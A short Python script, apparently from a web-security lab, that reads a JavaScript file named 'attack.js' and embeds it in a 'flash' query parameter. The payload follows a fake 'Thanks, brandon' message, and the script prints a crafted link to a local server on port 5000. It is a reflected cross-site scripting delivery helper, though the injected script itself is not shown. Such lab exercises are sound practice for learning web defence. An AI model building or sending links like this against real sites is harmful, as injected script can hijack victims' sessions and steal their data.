from urllib.parse import urlencode
with open('attack.js')as f:  # open attack.js to make url
    query = {'flash': 'Thanks, brandon' + f.read().strip().replace('\n', ' ')}
    # make url with fake massage 'Thanks, brandon' and attack
# print url that generated through the above code
print('http://localhost:5000/?' + urlencode(query))
